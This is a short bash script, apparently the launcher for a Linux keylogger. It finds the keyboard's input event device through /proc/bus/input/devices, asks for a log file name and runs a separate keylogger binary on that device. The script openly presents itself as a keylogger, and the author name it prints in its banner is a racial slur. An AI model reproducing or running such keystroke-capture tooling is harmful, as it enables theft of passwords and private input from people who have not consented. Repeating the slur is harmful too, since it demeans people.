#!/bin/bash

# ********************************************
# ********************************************
#
#          Made by niggasoftware
#
# ********************************************
# ********************************************
# Script for running the keylogger
#
#  GET THE EVENT NUMBER OF THE KEYBOARD 
#  line=`cat -n /proc/bus/input/devices | grep keyboard | tr -s ' ' | cut -d' ' -f2 | head -c 1`
#  cat -n /proc/bus/input/devices | tail -n+$line | head -n $(($line+7)) | grep -o event[0-500]
#


  # # ------------  ANSII COLORS ------------
  # Black        0;30     Dark Gray     1;30
  # Red          0;31     Light Red     1;31
  # Green        0;32     Light Green   1;32
  # Brown/Orange 0;33     Yellow        1;33
  # Blue         0;34     Light Blue    1;34
  # Purple       0;35     Light Purple  1;35
  # Cyan         0;36     Light Cyan    1;36
  # Light Gray   0;37     White         1;37
  # ------------------------------------------

  RED='\033[0;31m'
  BLACK='\033[0;30m'
  DARK_GREY='\033[1;30m'
  BLUE='\033[0;34m'
  GREEN='\033[0;32m'
  PURPLE='\033[0;35m'
  CYAN='\033[0;36m'
  LIGHT_GREY='\033[0;37m'
  NC='\033[0m' # No Color
printf "${DARK_GREY}***************************************************************${NC}\n"
printf "${DARK_GREY}***************************************************************${NC}\n"
printf "\n${PURPLE}        KEYLOGGER ${GREEN}- ${LIGHT_GREY}Made by ${RED}niggasoftware${NC}\n"
printf "\n${DARK_GREY}***************************************************************${NC}\n"
printf "${DARK_GREY}***************************************************************${NC}\n"

line=`cat -n /proc/bus/input/devices | grep keyboard | tr -s ' ' | cut -d' ' -f2 | head -c 1`
event=`cat -n /proc/bus/input/devices | tail -n+$line | head -n $(($line+7)) | grep -o event[0-500]` && printf "${GREEN}[+] Keyboard device detected${NC}\n" || printf "${RED}[+] No keyboard device detected${NC}\n"


printf "${GREEN}[+] Running keylogger on ${BLUE}$event${NC}\n"
printf "${GREEN}[+] Enter file where you want to save the log (default: KEY.log) :${NC}\n"
printf "${BLUE} > ${NC}"
read file
./keylogger $event $file
